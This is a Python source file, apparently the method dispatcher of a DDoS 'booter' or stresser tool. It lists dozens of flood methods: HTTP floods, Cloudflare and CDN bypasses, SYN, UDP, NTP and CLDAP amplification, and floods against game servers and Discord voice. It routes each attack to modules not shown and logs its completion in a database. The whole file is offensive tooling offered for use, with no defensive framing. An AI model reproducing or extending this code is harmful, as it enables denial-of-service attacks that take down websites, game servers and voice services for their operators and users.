# attacker/__init__.py — method dispatcher
import asyncio, time
from . import l7, l4, games, discord_vc

L7_METHODS = {
    "GET","POST","OVH","RHEX","STOMP","STRESS","DYN","DOWNLOADER","SLOW","HEAD",
    "NULL","COOKIE","PPS","EVEN","GSB","DGB","AVB","BOT","APACHE","XMLRPC",
    "CFB","CFBUAM","BYPASS","BOMB","KILLER","TOR",
    "HTTP","HTTPS","HTTPSLOAD","BYBROWSER","HTTPSBYPASS","CDNBYPASS",
}
L4_METHODS = {
    "TCP","UDP","SYN","OVH-UDP","CPS","ICMP","CONNECTION",
    "VSE","TS3","FIVEM","FIVEM-TOKEN","MEM","NTP","MCBOT","MINECRAFT",
    "MCPE","DNS","CHAR","CLDAP","ARD","RDP",
}
GAME_METHODS = {"FIVEM","FIVEM-TOKEN","MINECRAFT","MCPE","MCBOT","VSE","TS3","FF","FREEFIRE"}
VC_METHODS   = {"VC","DISCORD-VC","VC-FLOOD"}

ALL_METHODS = L7_METHODS | L4_METHODS | VC_METHODS

async def run(attack_id, target, port, duration, method):
    """dispatch. returns when attack completes."""
    method = method.upper()
    until = time.time() + duration
    try:
        if method in VC_METHODS:
            await discord_vc.flood(target, duration)
        elif method in ("FF", "FREEFIRE"):
            await games.freefire_flood(target, port, until)
        elif method in GAME_METHODS:
            await games.run(method, target, port, until)
        elif method in L7_METHODS:
            await l7.run(method, target, port, until)
        elif method in L4_METHODS:
            await l4.run(method, target, port, until)
        else:
            raise ValueError(f"unknown method: {method}")
    finally:
        from db import finish_attack
        finish_attack(attack_id)